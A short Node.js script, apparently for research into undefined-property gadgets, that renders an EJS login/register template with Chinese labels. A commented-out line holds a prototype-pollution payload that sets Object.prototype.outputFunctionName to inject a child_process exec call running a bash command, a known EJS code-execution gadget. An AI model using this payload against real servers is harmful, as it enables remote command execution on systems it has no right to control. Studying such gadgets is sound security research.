const ejs = require('ejs')

// Object.prototype.outputFunctionName = "_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"touch a.txt\"');var __tmp2"

// for node-find-undefined
console.log("===========start===========")

var result = ejs.renderFile('./views/login_register.ejs', {
    title:" storeHtml | logins ",
    buttonHintF:"登 录",
    buttonHintS:"没有账号?",
    hint:"登录",
    next:"/register"
})

// for node-find-undefined
console.log("===========end===========")
